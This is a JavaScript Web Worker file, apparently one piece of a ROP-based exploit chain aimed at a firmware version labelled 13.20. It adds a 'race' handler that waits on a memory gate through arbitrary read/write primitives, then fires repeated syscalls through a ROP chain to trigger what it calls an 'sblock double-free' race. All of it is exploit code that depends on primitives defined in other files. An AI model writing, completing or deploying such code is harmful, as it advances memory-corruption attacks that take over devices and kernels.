// rop_slave.js

// ================================================================
//  NOTE: This worker uses `p` and `chain` in the "race" handler.
//  If they are not defined in the worker scope, you must either:
//    - import the necessary scripts and re‑create them,
//    - or run the race entirely in the main thread and remove this handler.
// ================================================================

// Uncomment the following lines if you need to recreate p and chain inside the worker:
// importScripts('int64.js', 'mem.js', 'rop.js', '../offsets/13.20.js');
// // Then call the same initialization code as in main.js to obtain p and chain.
// // However, this will create a new worker and a new ROP setup – not recommended.

let my_worker = this;

self.onmessage = async function (event) {
    // ------------------------------------------------------------
    // NEW: "race" command for sblock double‑free
    // ------------------------------------------------------------
    if (event.data && event.data.cmd === "race") {
        let { handle, gateAddr, hitsAddr, count, syscallNo } = event.data;

        // Wait for the main thread to open the gate
        while (p.read4(gateAddr) === 0) {
            // spin
        }

        let hits = 0;
        for (let i = 0; i < count; i++) {
            let r = await chain.syscall(syscallNo, handle);
            if (r.low === 0) hits++;
        }

        p.write4(hitsAddr, hits);
        return;  // stop processing other messages
    }

    // ------------------------------------------------------------
    // Original handler: reply with 1 (used for ROP setup)
    // ------------------------------------------------------------
    self.postMessage(1);
};
